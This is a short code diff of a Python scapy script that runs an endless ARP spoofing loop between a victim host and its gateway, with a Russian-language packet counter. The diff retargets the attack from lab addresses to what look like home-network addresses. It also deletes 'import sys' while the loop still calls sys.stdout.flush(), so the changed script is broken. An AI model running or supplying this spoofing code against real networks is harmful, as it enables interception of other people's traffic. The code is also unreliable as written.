@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-import sys
 
 import scapy.all as scapy
 import time
@@ -21,8 +20,8 @@ def spoof(target_ip, spoof_ip):
 
 send_packets_count = 0
 while True:
-    spoof("10.0.2.7", "10.0.2.1")
-    spoof("10.0.2.1", "10.0.2.7")
+    spoof("192.168.31.174", "192.168.31.1")
+    spoof("192.168.31.1", "192.168.31.174")
     send_packets_count = send_packets_count + 2
     print("\r[+] Отправлено пакетов: " + str(send_packets_count), end="")
     sys.stdout.flush()
